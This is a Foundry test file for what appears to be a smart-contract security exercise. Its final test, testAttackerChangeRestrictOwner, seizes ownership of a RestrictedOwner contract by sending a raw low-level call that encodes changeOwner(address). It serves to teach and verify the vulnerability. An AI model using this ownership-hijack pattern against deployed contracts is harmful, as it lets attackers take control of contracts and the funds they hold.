pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../../src/call-attacks/call-attacks-1/RestrictedOwner.sol";
import "../../../src/call-attacks/call-attacks-1/UnrestrictedOwner.sol";

contract Call1Test is Test {
    RestrictedOwner restrictedOwner;
    UnrestrictedOwner unrestrictedOwner;
    address deployerAddress = address(100);
    address userAddress = address(101);
    address attacker = address(102);

    function setUp() public {
        vm.startPrank(deployerAddress);
        // Setup instance of the contract
        unrestrictedOwner = new UnrestrictedOwner();
        // emit address of contract.owner()
        emit log_named_address("owner", unrestrictedOwner.owner());
        // emit address of deployer for debugging
        emit log_named_address("deployer", deployerAddress);
        restrictedOwner = new RestrictedOwner(address(unrestrictedOwner));
        // emit address of contract.owner()
        emit log_named_address("owner", restrictedOwner.owner());
        vm.stopPrank();
        // Deal EOA address some ether
        vm.deal(deployerAddress, 1 ether);
        vm.deal(userAddress, 1 ether);
        vm.deal(attacker, 1 ether);
    }

    function testUserChanageUnrestrictOwner() public {
        // impersonate userAddress, and becomes owner of unrestrictedOwner
        vm.startPrank(userAddress);
        // emit address of contract.owner()
        emit log_named_address("owner before userAddress", unrestrictedOwner.owner());
        // call UnrestrictedOwner.changeOwner(address(userAddress))
        unrestrictedOwner.changeOwner(userAddress);
        // emit address of contract.owner()
        emit log_named_address("owner after userAddress", unrestrictedOwner.owner());
        vm.stopPrank();
        // assert that userAddress is now owner of unrestrictedOwner
        assertEq(unrestrictedOwner.owner(), userAddress);
    }

    // write a test that we expect to fail
    function testFailUserChanageRestrictOwner() public {
        // impersonate userAddress
        vm.startPrank(userAddress);
        // emit address of contract.owner()
        emit log_named_address("FAIL: owner before userAddress", restrictedOwner.owner());
        // call RestrictedOwner.updateSettings(); protected by owner should fail
        restrictedOwner.updateSettings(userAddress, userAddress);
        // emit address of contract.owner()
        emit log_named_address("FAIL: owner after userAddress", restrictedOwner.owner());
        vm.stopPrank();
    }

    // write attack test where attacker is able to become owner of  RestrictedOwner
    function testAttackerChangeRestrictOwner() public {
        // impersonate attacker
        vm.startPrank(attacker);
        // emit address of contract.owner()
        emit log_named_address("owner before attacker", restrictedOwner.owner());
        // call RestrictedOwner
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", attacker);
        (bool milady,) = address(restrictedOwner).call(payload);
        emit log_named_address("owner after attacker", restrictedOwner.owner());
        vm.stopPrank();
        // assert that attacker is now owner of restrictedOwner
        assertEq(restrictedOwner.owner(), attacker);
    }
}
